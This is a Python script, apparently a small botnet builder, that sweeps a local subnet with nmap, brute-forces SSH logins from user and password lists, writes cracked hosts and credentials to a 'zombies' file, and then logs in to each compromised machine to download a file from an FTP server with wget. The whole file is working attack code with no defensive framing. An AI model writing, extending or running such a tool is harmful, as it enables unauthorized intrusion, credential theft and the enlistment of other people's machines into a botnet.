from queue import Queue
from threading import Thread
import nmap
import paramiko

from Bot import BotNet
from Bot.threadSafePrint import threadSafePrint

scanner_t1 = nmap.PortScanner()
scanner_t2 = nmap.PortScanner()


def openFile(path, action='w'):
    try:
        return open(path, action)
    except:
        threadSafePrint("Something went wrong in opening file")
    finally:
        threadSafePrint("The 'try except' is finished")
        # TODO :


def sshLogin(user, ip, password):
    threadSafePrint("Starting ssh login thread for ", ip)
    try:
        p = paramiko.SSHClient()
        p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        p.connect(ip, port=22, username=user, password=password)
        # stdin, stdout, stderr = p.exec_command("echo "+password+" | sudo -S mkdir /home/kabali")
        # opt = stdout.readlines()
        # opt = "".join(opt)
        # threadSafePrint(opt)

        channel = p.invoke_shell()
        stdin = channel.makefile('wb')
        stdout = channel.makefile('rb')

        stdin.write(
            '''
        cd /home
        mkdir kabali
        cd kabali 
        wget --user=name --password=123 ftp://10.0.0.x/path
        ls
        exit
        '''
        )
        print(stdout.read())
    except:
        threadSafePrint("Something went wrong while login to ", ip, "with username ", user, "and password ", password)


def ssh(ip):
    threadSafePrint("Trying to login to ", ip)
    zombies = openFile('zombies.txt', 'a')
    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
                                                    'passdb=passwords.txt')

    if scanner_t2[ip].state() == 'up':
        protocols = scanner_t2[ip].all_protocols()
        if 'tcp' in protocols:
            ports = scanner_t2[ip]
            try:
                data = ports['tcp'][22]['script']['ssh-brute']
                user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
                zombies.write(ip + " " + user + " " + password + '\n')
                t = Thread(target=sshLogin, args=(user, ip, password))
                t.start()
            except:
                print("Not Connected")
    zombies.close()


def scan(q, network):
    threadSafePrint("Start scanning...")
    newConnectedIp = []
    while True:
        for ip in network:
            scanner_t1.scan(hosts=ip, arguments='-sn')
            threadSafePrint("Already found Ip ", newConnectedIp)
            threadSafePrint("Scanned :", scanner_t1.all_hosts())
            for newIp in scanner_t1.all_hosts():
                if newIp not in newConnectedIp:
                    threadSafePrint("new ip is found : ", newIp)
                    scanner_t1.scan(newIp, '1-1024', '-v -sS')
                    if scanner_t1[newIp].state() == 'up':
                        protocols = scanner_t1[newIp].all_protocols()
                        if 'tcp' in protocols:
                            ports = scanner_t1[newIp]['tcp'].keys()
                            threadSafePrint("Open port of ", newIp, ports)
                            if 22 in ports:
                                q.put(newIp + ":22")
                                newConnectedIp.append(newIp)
                                threadSafePrint("port 22 is opened")
                            else:
                                threadSafePrint("port 22 is not opened")
                        # TODO : for another protocol and port
                        else:
                            threadSafePrint("tcp is not in supported protocol list")
                    else:
                        threadSafePrint("The device in ", newIp, " is DOWN")
        threadSafePrint("A round is finished")
    threadSafePrint("Exiting from scanning...")


def attack(q):
    threadSafePrint("Start attack...")
    while True:
        if q.empty():
            pass
        else:
            ip, port = q.get().split(':')
            threadSafePrint("Trying to attack to ", ip, "on port ", port)
            if port.find("22") != -1:
                ssh(ip)
            else:
                threadSafePrint("There is no supported port to connect to ", ip)


if __name__ == '__main__':
    b = BotNet.BotNet(networks=["192.168.8.0/24"])
    network = ["192.168.8.0/24"]

    q = Queue()
    t1 = Thread(target=scan, args=(q, network))
    t2 = Thread(target=attack, args=(q,))
    t1.start()
    t2.start()
